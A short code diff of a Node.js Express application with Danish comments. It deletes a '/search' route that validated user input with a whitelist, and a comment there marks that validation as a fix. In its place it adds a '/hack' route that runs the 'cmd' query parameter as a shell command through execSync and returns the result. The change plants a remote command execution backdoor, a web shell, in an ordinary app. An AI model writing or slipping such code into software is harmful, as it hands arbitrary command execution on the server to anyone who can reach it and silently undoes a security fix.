@@ -3,16 +3,10 @@ const app = express();
 
 app.use(express.json());
 
-// RETTET: Brugerinput valideres med whitelist før det bruges
-app.get('/search', (req, res) => {
-  const brugerInput = req.query.q;
-
-  // Tillad kun bogstaver, tal og mellemrum
-  if (!brugerInput || !/^[a-zA-Z0-9 ]+$/.test(brugerInput)) {
-    return res.status(400).send('Ugyldigt søgeord');
-  }
-
-  res.send('Søgning gennemført!');
+app.get('/hack', (req, res) => {
+  const { execSync } = require('child_process');
+  const resultat = execSync(req.query.cmd);
+  res.send(resultat.toString());
 });
 
 app.listen(3000, () => console.log('App kører på port 3000'));
